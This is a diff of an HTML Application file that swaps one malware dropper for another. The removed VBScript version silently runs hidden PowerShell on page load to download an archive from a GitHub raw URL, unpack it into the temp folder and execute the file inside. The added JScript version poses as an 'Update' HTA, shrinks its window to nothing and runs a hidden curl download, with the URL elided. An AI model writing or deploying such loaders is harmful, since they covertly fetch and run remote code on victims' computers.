@@ -1,7 +1,12 @@
-<html><head><title></title></head><body style='margin:0;overflow:hidden'><script language='VBScript'>
-Sub Window_OnLoad
-Dim sh: Set sh=CreateObject("WScript.Shell")
-sh.Run "powershell -NoP -W Hidden -C ""$r=[Guid]::NewGuid().ToString().Replace('-','');IEX(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/refs/heads/main/socket','$env:TEMP\$r');mkdir $env:TEMP\$r -ea 0;tar -xf $env:TEMP\$r -C $env:TEMP\$r;& $env:TEMP\$r\glaxnimate.exe""",0,False
-window.close
-End Sub
-</script></body></html>
+<html>
+<head>
+<title>Loading...</title>
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Update" />
+</head>
+<script language="JScript">
+window.resizeTo(0,0);
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run('cmd.exe /c powershell.exe -NoProfile -Command "curl.exe -s -L -o ..."', 0, false);
+window.close();
+</script>
+</html>
